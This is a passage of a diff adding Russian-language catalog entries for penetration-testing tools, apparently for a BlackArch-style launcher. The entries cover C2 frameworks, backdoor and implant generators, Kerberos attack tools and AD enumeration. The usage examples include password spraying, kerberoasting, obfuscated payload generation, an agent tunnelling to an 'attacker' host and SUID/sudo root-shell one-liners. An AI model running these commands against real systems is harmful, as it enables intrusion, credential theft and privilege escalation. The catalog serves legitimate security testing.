+      {"flag": "-c", "description": "Файл с fingerprints"},
+      {"flag": "-o", "description": "Выходной файл"},
+      {"flag": "-a", "description": "Показать все результаты (не только уязвимые)"}
+    ]
+  },
+  {
+    "id": "hakrawler",
+    "name": "Hakrawler",
+    "version": "2.1",
+    "categories": ["blackarch-recon", "blackarch-webapp"],
+    "description": "Simple, fast web crawler designed for easy, quick discovery of endpoints",
+    "descriptionRu": "Простой и быстрый веб-краулер для обнаружения эндпоинтов и ссылок",
+    "helpRu": "Hakrawler — лёгкий веб-краулер для обнаружения URL, JavaScript-файлов, форм, эндпоинтов.\n\nОсновные возможности:\n- Простой интерфейс через stdin/stdout\n- Обнаружение URL, JS-файлов, форм\n- Контроль глубины и scope\n- Интеграция через pipe",
+    "url": "https://github.com/hakluke/hakrawler",
+    "command": "hakrawler",
+    "usageExamples": [
+      {"title": "Краулинг сайта", "command": "echo https://example.com | hakrawler", "description": "Обнаружить все эндпоинты"},
+      {"title": "С глубиной", "command": "echo https://example.com | hakrawler -d 3", "description": "Краулинг с глубиной 3"},
+      {"title": "Только JS файлы", "command": "echo https://example.com | hakrawler | grep '\\.js$'", "description": "Найти все JavaScript-файлы"}
+    ],
+    "parameters": [
+      {"flag": "-d", "description": "Глубина краулинга"},
+      {"flag": "-s", "description": "Scope (strict/subs/fuzzy)"},
+      {"flag": "-t", "description": "Количество потоков"},
+      {"flag": "-u", "description": "Показать только уникальные URL"},
+      {"flag": "-insecure", "description": "Отключить проверку TLS"}
+    ]
+  },
+  {
+    "id": "jwt-tool",
+    "name": "jwt_tool",
+    "version": "2.2.6",
+    "categories": ["blackarch-webapp", "blackarch-crypto"],
+    "description": "Toolkit for testing, tweaking and cracking JSON Web Tokens",
+    "descriptionRu": "Инструмент для тестирования, модификации и взлома JSON Web Tokens (JWT)",
+    "helpRu": "jwt_tool — тулкит для работы с JWT. Позволяет декодировать, модифицировать, подделывать и взламывать JWT-токены.\n\nОсновные возможности:\n- Декодирование JWT\n- Модификация claims\n- Атака none algorithm\n- Brute-force секрета\n- Confusion attack (RS256 → HS256)\n- Проверка на известные уязвимости\n- Injection в claims",
+    "url": "https://github.com/ticarpi/jwt_tool",
+    "command": "jwt_tool",
+    "usageExamples": [
+      {"title": "Декодирование JWT", "command": "jwt_tool eyJhbGciOiJIUzI1...", "description": "Декодировать и показать содержимое JWT"},
+      {"title": "Brute-force секрета", "command": "jwt_tool eyJhbGciOiJIUzI1... -C -d wordlist.txt", "description": "Перебор секрета по словарю"},
+      {"title": "Автоматическое тестирование", "command": "jwt_tool -t https://example.com -rh 'Authorization: Bearer eyJ...' -M at", "description": "Автоматическая проверка на все уязвимости"}
+    ],
+    "parameters": [
+      {"flag": "-C", "description": "Режим взлома секрета"},
+      {"flag": "-d", "description": "Словарь для brute-force"},
+      {"flag": "-M", "description": "Режим (at=all tests, pb=playbook)"},
+      {"flag": "-t", "description": "Целевой URL для тестирования"},
+      {"flag": "-rh", "description": "Заголовок запроса"},
+      {"flag": "-I", "description": "Inject в payload"},
+      {"flag": "-pc", "description": "Указать claim для изменения"}
+    ]
+  },
+  {
+    "id": "nosqlmap",
+    "name": "NoSQLMap",
+    "version": "0.7",
+    "categories": ["blackarch-webapp", "blackarch-exploitation"],
+    "description": "Automated NoSQL database enumeration and web application exploitation tool",
+    "descriptionRu": "Автоматизированный инструмент для перечисления NoSQL баз данных и эксплуатации NoSQL-инъекций",
+    "helpRu": "NoSQLMap — инструмент для тестирования NoSQL баз данных на уязвимости инъекций. Поддерживает MongoDB, CouchDB и другие.\n\nОсновные возможности:\n- Автоматическое обнаружение NoSQL-инъекций\n- Эксплуатация MongoDB\n- Перечисление баз данных\n- Дамп данных\n- Атаки на аутентификацию",
+    "url": "https://github.com/codingo/NoSQLMap",
+    "command": "nosqlmap",
+    "usageExamples": [
+      {"title": "Интерактивный режим", "command": "nosqlmap", "description": "Запуск интерактивного меню"},
+      {"title": "Сканирование MongoDB", "command": "nosqlmap --attack 2 --victim target --port 27017", "description": "Проверка MongoDB на открытый доступ"}
+    ],
+    "parameters": [
+      {"flag": "--attack", "description": "Тип атаки (1=NoSQL injection, 2=MongoDB)"},
+      {"flag": "--victim", "description": "Целевой хост"},
+      {"flag": "--port", "description": "Порт цели"},
+      {"flag": "--uri", "description": "URI для тестирования инъекций"}
+    ]
+  },
+  {
+    "id": "sslyze",
+    "name": "SSLyze",
+    "version": "6.0.0",
+    "categories": ["blackarch-scanner", "blackarch-crypto"],
+    "description": "Fast and powerful SSL/TLS scanning library and CLI tool",
+    "descriptionRu": "Быстрый и мощный анализатор SSL/TLS конфигурации серверов",
+    "helpRu": "SSLyze — инструмент для анализа SSL/TLS конфигурации серверов. Обнаруживает уязвимости, слабые шифры и ошибки конфигурации.\n\nОсновные возможности:\n- Проверка поддерживаемых протоколов (SSL 2/3, TLS 1.0-1.3)\n- Обнаружение уязвимых шифров\n- Heartbleed, ROBOT, CRIME проверки\n- Проверка сертификатов\n- Поддержка STARTTLS\n- JSON вывод",
+    "url": "https://github.com/nabla-c0d3/sslyze",
+    "command": "sslyze",
+    "usageExamples": [
+      {"title": "Полный анализ", "command": "sslyze example.com", "description": "Полный анализ SSL/TLS конфигурации"},
+      {"title": "Проверка сертификата", "command": "sslyze --certinfo example.com", "description": "Детальная информация о сертификате"},
+      {"title": "JSON вывод", "command": "sslyze --json_out=results.json example.com", "description": "Сохранить результаты в JSON"}
+    ],
+    "parameters": [
+      {"flag": "--regular", "description": "Стандартное сканирование"},
+      {"flag": "--certinfo", "description": "Информация о сертификате"},
+      {"flag": "--heartbleed", "description": "Проверка Heartbleed"},
+      {"flag": "--robot", "description": "Проверка ROBOT"},
+      {"flag": "--json_out", "description": "Сохранить в JSON"},
+      {"flag": "--starttls", "description": "Протокол STARTTLS (smtp, ftp, и др.)"}
+    ]
+  },
+  {
+    "id": "sslscan",
+    "name": "sslscan",
+    "version": "2.1.3",
+    "categories": ["blackarch-scanner", "blackarch-crypto"],
+    "description": "Tests SSL/TLS enabled services to discover supported cipher suites",
+    "descriptionRu": "Тестирование SSL/TLS сервисов для обнаружения поддерживаемых шифров и уязвимостей",
+    "helpRu": "sslscan — инструмент для тестирования SSL/TLS конфигурации. Быстро определяет поддерживаемые протоколы и шифры.\n\nОсновные возможности:\n- Определение поддерживаемых шифров\n- Проверка протоколов (SSLv2/3, TLS 1.0-1.3)\n- Heartbleed проверка\n- Renegotiation проверка\n- Информация о сертификате\n- Цветной вывод с подсветкой слабых шифров",
+    "url": "https://github.com/rbsec/sslscan",
+    "command": "sslscan",
+    "usageExamples": [
+      {"title": "Сканирование сервера", "command": "sslscan example.com", "description": "Полный анализ SSL/TLS"},
+      {"title": "Без цвета", "command": "sslscan --no-colour example.com", "description": "Вывод без цветовой разметки"},
+      {"title": "STARTTLS", "command": "sslscan --starttls-smtp mail.example.com:25", "description": "Проверка SMTP с STARTTLS"}
+    ],
+    "parameters": [
+      {"flag": "--show-certificate", "description": "Показать детали сертификата"},
+      {"flag": "--no-colour", "description": "Отключить цветной вывод"},
+      {"flag": "--starttls-smtp", "description": "STARTTLS для SMTP"},
+      {"flag": "--starttls-ftp", "description": "STARTTLS для FTP"},
+      {"flag": "--xml", "description": "Вывод в XML"},
+      {"flag": "--no-heartbleed", "description": "Пропустить проверку Heartbleed"}
+    ]
+  },
+  {
+    "id": "havoc",
+    "name": "Havoc",
+    "version": "0.6",
+    "categories": ["blackarch-exploitation", "blackarch-backdoor"],
+    "description": "Modern and malleable post-exploitation command and control framework",
+    "descriptionRu": "Современный C2-фреймворк для пост-эксплуатации с графическим интерфейсом и гибкими агентами",
+    "helpRu": "Havoc — современный C2-фреймворк (Command & Control) с графическим интерфейсом. Предоставляет возможности для управления скомпрометированными хостами.\n\nОсновные возможности:\n- Графический интерфейс (Qt)\n- Demon agent (собственный агент)\n- Поддержка сторонних агентов\n- Sleep obfuscation\n- Indirect syscalls\n- x64 PE загрузка\n- Token manipulation\n- BOF (Beacon Object Files) поддержка",
+    "url": "https://github.com/HavocFramework/Havoc",
+    "command": "havoc",
+    "usageExamples": [
+      {"title": "Запуск сервера", "command": "havoc server --profile profile.yaotl", "description": "Запустить teamserver с профилем"},
+      {"title": "Запуск клиента", "command": "havoc client", "description": "Открыть графический клиент"}
+    ],
+    "parameters": [
+      {"flag": "server", "description": "Запустить teamserver"},
+      {"flag": "client", "description": "Запустить GUI клиент"},
+      {"flag": "--profile", "description": "Файл профиля конфигурации"},
+      {"flag": "-v", "description": "Подробный вывод"}
+    ]
+  },
+  {
+    "id": "sliver",
+    "name": "Sliver",
+    "version": "1.5.42",
+    "categories": ["blackarch-exploitation", "blackarch-backdoor"],
+    "description": "Open source cross-platform adversary emulation/red team framework",
+    "descriptionRu": "Кроссплатформенный C2-фреймворк для red team с поддержкой мультипротокольных имплантов",
+    "helpRu": "Sliver — кроссплатформенный C2-фреймворк (Red Team). Альтернатива Cobalt Strike с открытым исходным кодом.\n\nОсновные возможности:\n- Мультипротокольные импланты (mTLS, HTTP/S, DNS, WireGuard)\n- Кроссплатформенность (Windows, Linux, macOS)\n- Динамическая компиляция имплантов\n- Поддержка BOF (Beacon Object Files)\n- Staged/stageless пейлоады\n- Multiplayer (командная работа)\n- Pivoting и tunneling",
+    "url": "https://github.com/BishopFox/sliver",
+    "command": "sliver",
+    "usageExamples": [
+      {"title": "Запуск сервера", "command": "sliver-server", "description": "Запустить Sliver teamserver"},
+      {"title": "Подключение клиента", "command": "sliver", "description": "Подключиться к teamserver"},
+      {"title": "Генерация импланта", "command": "generate --mtls 10.10.10.1 --os windows", "description": "Сгенерировать Windows имплант с mTLS"}
+    ],
+    "parameters": [
+      {"flag": "generate", "description": "Генерация импланта"},
+      {"flag": "--mtls", "description": "mTLS listener адрес"},
+      {"flag": "--http", "description": "HTTP listener адрес"},
+      {"flag": "--dns", "description": "DNS listener домен"},
+      {"flag": "--os", "description": "Целевая ОС (windows/linux/darwin)"},
+      {"flag": "--arch", "description": "Архитектура (amd64/386)"},
+      {"flag": "profiles", "description": "Управление профилями имплантов"}
+    ]
+  },
+  {
+    "id": "covenant",
+    "name": "Covenant",
+    "version": "0.6",
+    "categories": ["blackarch-exploitation", "blackarch-backdoor"],
+    "description": ".NET command and control framework",
+    "descriptionRu": ".NET C2-фреймворк с веб-интерфейсом для управления Grunt-агентами",
+    "helpRu": "Covenant — .NET C2-фреймворк с удобным веб-интерфейсом. Использует .NET-базированные агенты (Grunts).\n\nОсновные возможности:\n- Веб-интерфейс для управления\n- .NET Grunt агенты\n- Многопользовательский режим\n- Различные listener типы (HTTP, Bridge)\n- Встроенные задачи и модули\n- Графы связей и визуализация",
+    "url": "https://github.com/cobbr/Covenant",
+    "command": "covenant",
+    "usageExamples": [
+      {"title": "Запуск Covenant", "command": "dotnet run --project Covenant", "description": "Запустить Covenant с веб-интерфейсом"}
+    ],
+    "parameters": [
+      {"flag": "--urls", "description": "URL для веб-интерфейса"},
+      {"flag": "--project", "description": "Путь к проекту Covenant"}
+    ]
+  },
+  {
+    "id": "villain",
+    "name": "Villain",
+    "version": "2.4.3",
+    "categories": ["blackarch-exploitation", "blackarch-backdoor"],
+    "description": "Windows & Linux backdoor generator and multi-session handler",
+    "descriptionRu": "Генератор бэкдоров для Windows/Linux и многосессионный обработчик reverse shell",
+    "helpRu": "Villain — генератор и обработчик бэкдоров с поддержкой HoaxShell. Генерирует пейлоады и управляет несколькими сессиями.\n\nОсновные возможности:\n- Генерация PowerShell и bash пейлоадов\n- Многосессионный обработчик\n- HoaxShell HTTP/S бэкдоры\n- Обход AMSI/ETW\n- Совместная работа (sibling servers)",
+    "url": "https://github.com/t3l3machus/Villain",
+    "command": "villain",
+    "usageExamples": [
+      {"title": "Запуск Villain", "command": "villain -p 8080", "description": "Запустить обработчик на порту 8080"},
+      {"title": "Генерация пейлоада", "command": "generate os=windows lhost=10.10.10.1 obfuscate", "description": "Сгенерировать обфусцированный Windows-пейлоад"}
+    ],
+    "parameters": [
+      {"flag": "-p", "description": "Порт для HTTP listener"},
+      {"flag": "-x", "description": "Порт для HoaxShell listener"},
+      {"flag": "-n", "description": "Netcat listener порт"},
+      {"flag": "-i", "description": "IP для listener"}
+    ]
+  },
+  {
+    "id": "ligolo-proxy",
+    "name": "Ligolo-proxy",
+    "version": "0.6.1",
+    "categories": ["blackarch-tunnel", "blackarch-proxy"],
+    "description": "Advanced yet simple tunneling/pivoting tool using a TUN interface",
+    "descriptionRu": "Продвинутый инструмент туннелирования и pivoting через TUN-интерфейс без использования SOCKS",
+    "helpRu": "Ligolo-proxy — инструмент для создания прозрачных туннелей через TUN-интерфейс. Не использует SOCKS, что делает его прозрачным для инструментов.\n\nОсновные возможности:\n- TUN-интерфейс (прозрачный для всех инструментов)\n- Шифрование TLS\n- Мультиплексирование соединений\n- Перенаправление портов (listeners)\n- Не требует SOCKS/proxychains\n- Кроссплатформенность",
+    "url": "https://github.com/nicocha30/ligolo-ng",
+    "command": "ligolo-proxy",
+    "usageExamples": [
+      {"title": "Запуск прокси", "command": "ligolo-proxy -selfcert -laddr 0.0.0.0:11601", "description": "Запустить прокси с самоподписанным сертификатом"},
+      {"title": "Агент на цели", "command": "ligolo-agent -connect attacker:11601 -ignore-cert", "description": "Подключить агент к прокси"}
+    ],
+    "parameters": [
+      {"flag": "-selfcert", "description": "Использовать самоподписанный сертификат"},
+      {"flag": "-laddr", "description": "Адрес для прослушивания"},
+      {"flag": "-certfile", "description": "Файл TLS сертификата"},
+      {"flag": "-keyfile", "description": "Файл TLS ключа"}
+    ]
+  },
+  {
+    "id": "kerbrute",
+    "name": "Kerbrute",
+    "version": "1.0.3",
+    "categories": ["blackarch-cracker", "blackarch-windows"],
+    "description": "Tool to perform Kerberos pre-auth bruteforcing",
+    "descriptionRu": "Инструмент для brute-force Kerberos pre-authentication — перечисление пользователей и подбор паролей",
+    "helpRu": "Kerbrute — инструмент для атак на Kerberos pre-authentication в Active Directory.\n\nОсновные возможности:\n- Перечисление пользователей (user enumeration)\n- Brute-force паролей через Kerberos\n- Password spraying\n- Быстрый и скрытный (не генерирует стандартные события входа)\n- Не блокирует учётные записи при user enumeration",
+    "url": "https://github.com/ropnop/kerbrute",
+    "command": "kerbrute",
+    "usageExamples": [
+      {"title": "Перечисление пользователей", "command": "kerbrute userenum -d domain.local users.txt --dc 10.10.10.1", "description": "Проверить какие пользователи существуют в домене"},
+      {"title": "Password spraying", "command": "kerbrute passwordspray -d domain.local users.txt 'Password123'", "description": "Проверить один пароль для всех пользователей"},
+      {"title": "Brute-force", "command": "kerbrute bruteuser -d domain.local passwords.txt admin", "description": "Перебор паролей для конкретного пользователя"}
+    ],
+    "parameters": [
+      {"flag": "userenum", "description": "Режим перечисления пользователей"},
+      {"flag": "passwordspray", "description": "Режим password spraying"},
+      {"flag": "bruteuser", "description": "Режим brute-force для пользователя"},
+      {"flag": "-d", "description": "Домен Active Directory"},
+      {"flag": "--dc", "description": "IP контроллера домена"},
+      {"flag": "-t", "description": "Количество потоков"},
+      {"flag": "-o", "description": "Выходной файл"}
+    ]
+  },
+  {
+    "id": "rubeus",
+    "name": "Rubeus",
+    "version": "2.3.2",
+    "categories": ["blackarch-exploitation", "blackarch-windows"],
+    "description": "C# toolset for raw Kerberos interaction and abuses",
+    "descriptionRu": "C# инструмент для атак на Kerberos — Kerberoasting, AS-REP Roasting, Golden/Silver Ticket и др.",
+    "helpRu": "Rubeus — инструмент для взаимодействия с Kerberos в Active Directory. Реализует множество атак на Kerberos.\n\nОсновные возможности:\n- Kerberoasting (запрос TGS для оффлайн-взлома)\n- AS-REP Roasting\n- Pass-the-Ticket\n- Overpass-the-Hash\n- Golden/Silver Ticket\n- S4U delegation abuse\n- Ticket extraction и renewal",
+    "url": "https://github.com/GhostPack/Rubeus",
+    "command": "Rubeus.exe",
+    "usageExamples": [
+      {"title": "Kerberoasting", "command": "Rubeus.exe kerberoast /outfile:hashes.txt", "description": "Запросить TGS для всех SPN и сохранить хеши"},
+      {"title": "AS-REP Roasting", "command": "Rubeus.exe asreproast /outfile:asrep.txt", "description": "Найти пользователей без pre-auth и получить хеши"},
+      {"title": "Pass-the-Ticket", "command": "Rubeus.exe ptt /ticket:ticket.kirbi", "description": "Импортировать Kerberos тикет в текущую сессию"},
+      {"title": "Запрос TGT", "command": "Rubeus.exe asktgt /user:admin /password:pass /domain:domain.local", "description": "Запросить TGT для пользователя"}
+    ],
+    "parameters": [
+      {"flag": "kerberoast", "description": "Kerberoasting атака"},
+      {"flag": "asreproast", "description": "AS-REP Roasting атака"},
+      {"flag": "asktgt", "description": "Запрос TGT"},
+      {"flag": "ptt", "description": "Pass-the-Ticket"},
+      {"flag": "dump", "description": "Дамп Kerberos тикетов из памяти"},
+      {"flag": "/user", "description": "Имя пользователя"},
+      {"flag": "/password", "description": "Пароль"},
+      {"flag": "/outfile", "description": "Выходной файл"}
+    ]
+  },
+  {
+    "id": "powershell-empire",
+    "name": "Empire",
+    "version": "5.9.5",
+    "categories": ["blackarch-exploitation", "blackarch-backdoor", "blackarch-windows"],
+    "description": "Post-exploitation and adversary emulation framework",
+    "descriptionRu": "Пост-эксплуатационный фреймворк для PowerShell/Python/C# агентов с обширной библиотекой модулей",
+    "helpRu": "Empire — пост-эксплуатационный фреймворк с PowerShell, Python и C# агентами. Преемник PowerShell Empire.\n\nОсновные возможности:\n- PowerShell, Python, C# агенты\n- Обширная библиотека модулей (300+)\n- HTTP/S, Dropbox, OneDrive listeners\n- Malleable C2 профили\n- Credential harvesting\n- Lateral movement\n- REST API\n- Starkiller GUI",
+    "url": "https://github.com/BC-SECURITY/Empire",
+    "command": "empire",
+    "usageExamples": [
+      {"title": "Запуск сервера", "command": "empire server", "description": "Запустить Empire сервер"},
+      {"title": "Запуск клиента", "command": "empire client", "description": "Запустить CLI-клиент"},
+      {"title": "Starkiller GUI", "command": "starkiller", "description": "Открыть веб-GUI Starkiller"}
+    ],
+    "parameters": [
+      {"flag": "server", "description": "Запустить сервер"},
+      {"flag": "client", "description": "Запустить CLI клиент"},
+      {"flag": "--restport", "description": "Порт REST API"},
+      {"flag": "--username", "description": "Имя пользователя"},
+      {"flag": "--password", "description": "Пароль"}
+    ]
+  },
+  {
+    "id": "seatbelt",
+    "name": "Seatbelt",
+    "version": "1.2.2",
+    "categories": ["blackarch-recon", "blackarch-windows"],
+    "description": "C# project for performing host security-oriented survey",
+    "descriptionRu": "C# инструмент для сбора информации о безопасности Windows хоста (ситуационная осведомлённость)",
+    "helpRu": "Seatbelt — инструмент для сбора информации о безопасности Windows системы. Выполняет десятки проверок для оценки защищённости.\n\nОсновные возможности:\n- Информация об ОС, домене, пользователях\n- Установленное ПО и обновления\n- Сохранённые учётные данные\n- Сетевая конфигурация\n- Задачи планировщика\n- Службы и процессы\n- Политики безопасности",
+    "url": "https://github.com/GhostPack/Seatbelt",
+    "command": "Seatbelt.exe",
+    "usageExamples": [
+      {"title": "Все проверки", "command": "Seatbelt.exe -group=all", "description": "Запустить все проверки безопасности"},
+      {"title": "Системная информация", "command": "Seatbelt.exe -group=system", "description": "Информация о системе"},
+      {"title": "Учётные данные", "command": "Seatbelt.exe -group=misc", "description": "Поиск сохранённых учётных данных"}
+    ],
+    "parameters": [
+      {"flag": "-group=all", "description": "Все проверки"},
+      {"flag": "-group=system", "description": "Системная информация"},
+      {"flag": "-group=user", "description": "Пользовательская информация"},
+      {"flag": "-group=misc", "description": "Разные проверки"},
+      {"flag": "-group=chrome", "description": "Данные Chrome"},
+      {"flag": "-outputfile", "description": "Сохранить результаты в файл"}
+    ]
+  },
+  {
+    "id": "winpeas",
+    "name": "WinPEAS",
+    "version": "2.0",
+    "categories": ["blackarch-exploitation", "blackarch-windows"],
+    "description": "Windows Privilege Escalation Awesome Scripts",
+    "descriptionRu": "Скрипт для автоматического поиска путей повышения привилегий в Windows",
+    "helpRu": "WinPEAS — скрипт для автоматического перечисления возможных путей повышения привилегий в Windows.\n\nПроверяет:\n- Сервисы с неправильными разрешениями\n- Unquoted service paths\n- AlwaysInstallElevated\n- Сохранённые учётные данные\n- Scheduled tasks\n- DLL hijacking\n- AutoLogon credentials\n- И многое другое",
+    "url": "https://github.com/carlospolop/PEASS-ng",
+    "command": "winPEASx64.exe",
+    "usageExamples": [
+      {"title": "Полная проверка", "command": "winPEASx64.exe", "description": "Запустить все проверки привилегий"},
+      {"title": "Быстрая проверка", "command": "winPEASx64.exe fast", "description": "Быстрый режим без медленных проверок"},
+      {"title": "Конкретные проверки", "command": "winPEASx64.exe servicesinfo", "description": "Только информация о сервисах"}
+    ],
+    "parameters": [
+      {"flag": "fast", "description": "Быстрый режим"},
+      {"flag": "cmd", "description": "Использовать cmd вместо PowerShell"},
+      {"flag": "servicesinfo", "description": "Проверка сервисов"},
+      {"flag": "userinfo", "description": "Информация о пользователях"},
+      {"flag": "systeminfo", "description": "Системная информация"},
+      {"flag": "log", "description": "Сохранить вывод в файл"}
+    ]
+  },
+  {
+    "id": "pspy",
+    "name": "pspy",
+    "version": "1.2.1",
+    "categories": ["blackarch-recon", "blackarch-exploitation"],
+    "description": "Monitor linux processes without root permissions",
+    "descriptionRu": "Мониторинг процессов Linux без прав root — обнаружение cron-задач и скрытых процессов",
+    "helpRu": "pspy — инструмент для мониторинга процессов Linux без привилегий root. Использует inotify для отслеживания файловой системы.\n\nОсновные возможности:\n- Обнаружение запускаемых процессов в реальном времени\n- Отслеживание cron-задач\n- Мониторинг без root\n- Обнаружение скрытых скриптов и команд\n- Полезен для поиска путей привилегий",
+    "url": "https://github.com/DominicBreuker/pspy",
+    "command": "pspy64",
+    "usageExamples": [
+      {"title": "Мониторинг процессов", "command": "./pspy64", "description": "Начать мониторинг всех запускаемых процессов"},
+      {"title": "С файловой системой", "command": "./pspy64 -f", "description": "Показывать также файловые события"},
+      {"title": "Цветной вывод", "command": "./pspy64 -c", "description": "Цветной вывод для удобства чтения"}
+    ],
+    "parameters": [
+      {"flag": "-f", "description": "Показывать файловые события"},
+      {"flag": "-c", "description": "Цветной вывод"},
+      {"flag": "-r", "description": "Директории для мониторинга через inotify"},
+      {"flag": "-d", "description": "Дополнительные директории для наблюдения"},
+      {"flag": "-i", "description": "Интервал сканирования /proc (мс)"}
+    ]
+  },
+  {
+    "id": "gtfobins-cli",
+    "name": "GTFOBins Lookup",
+    "version": "1.0",
+    "categories": ["blackarch-exploitation", "blackarch-misc"],
+    "description": "Curated list of Unix binaries that can be used to bypass security restrictions",
+    "descriptionRu": "Справочник Unix-бинарников для обхода ограничений безопасности, повышения привилегий и escape из shell",
+    "helpRu": "GTFOBins — онлайн-справочник Unix-бинарников, которые можно использовать для обхода ограничений безопасности в неправильно сконфигурированных системах.\n\nКатегории:\n- Shell — получение shell\n- File Upload/Download — передача файлов\n- SUID — повышение привилегий через SUID\n- Sudo — эксплуатация sudo-правил\n- Capabilities — злоупотребление Linux capabilities\n- Reverse Shell — создание reverse shell\n- Bind Shell — создание bind shell\n- File Read/Write — чтение/запись файлов",
+    "url": "https://gtfobins.github.io/",
+    "command": "curl -s https://gtfobins.github.io/",
+    "usageExamples": [
+      {"title": "Поиск binary", "command": "# Открыть https://gtfobins.github.io/gtfobins/python/", "description": "Найти способы эксплуатации python через GTFOBins"},
+      {"title": "SUID эксплуатация find", "command": "find . -exec /bin/sh -p \\; -quit", "description": "Пример: получить root shell через SUID find"},
+      {"title": "Sudo vim", "command": "sudo vim -c ':!/bin/sh'", "description": "Пример: shell через sudo vim"}
+    ],
+    "parameters": []
+  },
+  {
+    "id": "bloodhound-py",
+    "name": "BloodHound.py",
+    "version": "1.7.1",
+    "categories": ["blackarch-recon", "blackarch-windows"],
+    "description": "Python based ingestor for BloodHound",
+    "descriptionRu": "Python-сборщик данных для BloodHound — альтернатива SharpHound для Linux",
+    "helpRu": "BloodHound.py — Python-реализация сборщика данных (ingestor) для BloodHound. Работает из Linux без необходимости запуска SharpHound на Windows.\n\nОсновные возможности:\n- Сбор данных из Active Directory через LDAP\n- Перечисление пользователей, групп, компьютеров\n- Определение сессий и ACL\n- Kerberos аутентификация\n- Работа из Linux/macOS",
+    "url": "https://github.com/dirkjanm/BloodHound.py",
+    "command": "bloodhound-python",
+    "usageExamples": [
+      {"title": "Полный сбор данных", "command": "bloodhound-python -u user -p pass -d domain.local -c All -ns 10.10.10.1", "description": "Собрать все данные AD для BloodHound"},
+      {"title": "Только пользователи и группы", "command": "bloodhound-python -u user -p pass -d domain.local -c Group,LocalAdmin", "description": "Собрать информацию о группах и локальных админах"}
+    ],
+    "parameters": [
+      {"flag": "-u", "description": "Имя пользователя"},
+      {"flag": "-p", "description": "Пароль"},
+      {"flag": "-d", "description": "Домен"},
+      {"flag": "-c", "description": "Методы сбора (All, Group, Session, LocalAdmin, ACL, Trust)"},
+      {"flag": "-ns", "description": "DNS-сервер (контроллер домена)"},
+      {"flag": "--zip", "description": "Сжать результаты в ZIP"},
+      {"flag": "-k", "description": "Использовать Kerberos аутентификацию"}
+    ]
+  },
+  {
+    "id": "ldapdomaindump",
+    "name": "ldapdomaindump",
+    "version": "0.9.4",
+    "categories": ["blackarch-recon", "blackarch-windows"],
+    "description": "Active Directory information dumper via LDAP",
+    "descriptionRu": "Дамп информации Active Directory через LDAP — пользователи, группы, политики, компьютеры",
+    "helpRu": "ldapdomaindump — инструмент для дампа информации Active Directory через LDAP. Генерирует удобные HTML/JSON/grep отчёты.\n\nОсновные возможности:\n- Дамп пользователей, групп, компьютеров\n- Дамп политик и доверительных отношений\n- HTML отчёты для удобного просмотра\n- JSON и grep-форматы\n- Поддержка LDAPS и аутентификации",
+    "url": "https://github.com/dirkjanm/ldapdomaindump",
+    "command": "ldapdomaindump",
+    "usageExamples": [
+      {"title": "Дамп AD", "command": "ldapdomaindump -u 'DOMAIN\\user' -p pass ldap://10.10.10.1", "description": "Дамп всей информации AD"},
+      {"title": "Через LDAPS", "command": "ldapdomaindump -u 'DOMAIN\\user' -p pass ldaps://10.10.10.1", "description": "Дамп через защищённый LDAP"}
+    ],
+    "parameters": [
+      {"flag": "-u", "description": "Имя пользователя (DOMAIN\\user)"},
+      {"flag": "-p", "description": "Пароль"},
+      {"flag": "-o", "description": "Директория для вывода"},
+      {"flag": "--no-html", "description": "Не генерировать HTML"},
+      {"flag": "--no-json", "description": "Не генерировать JSON"},
+      {"flag": "--no-grep", "description": "Не генерировать grep-формат"}
+    ]
+  },
+  {
+    "id": "enum4linux-ng",
+    "name": "enum4linux-ng",
+    "version": "1.3.3",
+    "categories": ["blackarch-recon", "blackarch-windows"],
+    "description": "Next generation enum4linux rewrite in Python",
+    "descriptionRu": "Перезапись enum4linux на Python — перечисление SMB, RPC, LDAP на Windows/Samba",
+    "helpRu": "enum4linux-ng — переписанная на Python версия enum4linux с расширенными возможностями.\n\nОсновные возможности:\n- Перечисление пользователей, групп, шар\n- RID cycling\n- Информация об ОС\n- Политики паролей\n- LDAP перечисление\n- Вывод в JSON/YAML",
+    "url": "https://github.com/cddmp/enum4linux-ng",
+    "command": "enum4linux-ng",
+    "usageExamples": [
+      {"title": "Полное перечисление", "command": "enum4linux-ng -A target", "description": "Все проверки на целевом хосте"},
+      {"title": "С учётными данными", "command": "enum4linux-ng -A -u user -p pass target", "description": "Перечисление с аутентификацией"},
+      {"title": "JSON вывод", "command": "enum4linux-ng -A -oJ output target", "description": "Результаты в JSON формате"}
+    ],
+    "parameters": [
+      {"flag": "-A", "description": "Все проверки"},
+      {"flag": "-u", "description": "Имя пользователя"},
+      {"flag": "-p", "description": "Пароль"},
+      {"flag": "-oJ", "description": "Вывод в JSON"},
+      {"flag": "-oY", "description": "Вывод в YAML"},
+      {"flag": "-U", "description": "Перечисление пользователей"},
+      {"flag": "-S", "description": "Перечисление шар"},
+      {"flag": "-G", "description": "Перечисление групп"}
+    ]
+  },
+  {
+    "id": "crackhash",
+    "name": "Name-That-Hash",
+    "version": "1.11.0",
+    "categories": ["blackarch-cracker", "blackarch-crypto"],
+    "description": "Identify hash types and suggest Hashcat/John modes",
+    "descriptionRu": "Идентификация типов хешей с подсказкой режимов Hashcat и John the Ripper",
+    "helpRu": "Name-That-Hash — инструмент для определения типа хеша. Показывает какой алгоритм использовался и предлагает режим Hashcat/John.\n\nОсновные возможности:\n- Определение 300+ типов хешей\n- Подсказка режимов Hashcat (-m)\n- Подсказка форматов John\n- Ранжирование по популярности\n- Цветной вывод",
+    "url": "https://github.com/HashPals/Name-That-Hash",
+    "command": "nth",
+    "usageExamples": [
+      {"title": "Определить хеш", "command": "nth -t '5d41402abc4b2a76b9719d911017c592'", "description": "Определить тип хеша"},
+      {"title": "Из файла", "command": "nth -f hashes.txt", "description": "Определить типы хешей из файла"},
+      {"title": "Greppable формат", "command": "nth -t 'hash' -g", "description": "Вывод для grep"}
+    ],
+    "parameters": [
+      {"flag": "-t", "description": "Хеш для идентификации"},
+      {"flag": "-f", "description": "Файл с хешами"},
+      {"flag": "-g", "description": "Greppable вывод"},
+      {"flag": "-a", "description": "Показать все возможные типы"}
+    ]
+  },
+  {
+    "id": "haiti",
+    "name": "Haiti",
+    "version": "2.1.0",
+    "categories": ["blackarch-cracker", "blackarch-crypto"],
+    "description": "Hash type identifier with Hashcat and John the Ripper references",
+    "descriptionRu": "Быстрый идентификатор типов хешей со ссылками на режимы Hashcat и John the Ripper",
+    "helpRu": "Haiti — ещё один идентификатор хешей. Быстрый и с поддержкой множества форматов.\n\nОсновные возможности:\n- Определение типа хеша\n- Hashcat mode ID\n- John format name\n- Поддержка 500+ типов",
+    "url": "https://github.com/noraj/haiti",
+    "command": "haiti",
+    "usageExamples": [
